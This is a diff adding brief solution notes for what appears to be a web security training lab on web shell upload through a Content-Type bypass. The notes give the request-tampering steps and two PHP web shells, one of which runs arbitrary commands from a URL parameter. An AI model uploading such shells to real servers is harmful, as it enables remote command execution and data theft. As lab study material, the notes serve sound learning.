@@ -1,0 +1,21 @@
+Web shell upload via Content-Type restriction bypass
+Goal: Exploit the file upload vulnerability to exfiltrate the contents of the file /home/carlos/secret
+wiener:peter
+
+1)
+-login
+-send image/png
+-> Ok
+-send shell.php
+-> Not Allowed
+-send webshell post to repeater
+-change Content-Type: application/octet-stream to Content-Type: image/png
+-Visit /files/avatars/shell.php
+
+-Payload Option
+shell.php
+<?php echo file_get_contents('/home/carlos/secret');?>
+
+Payload Option
+shell.php
+<?php system($_GET['cmd']);?>
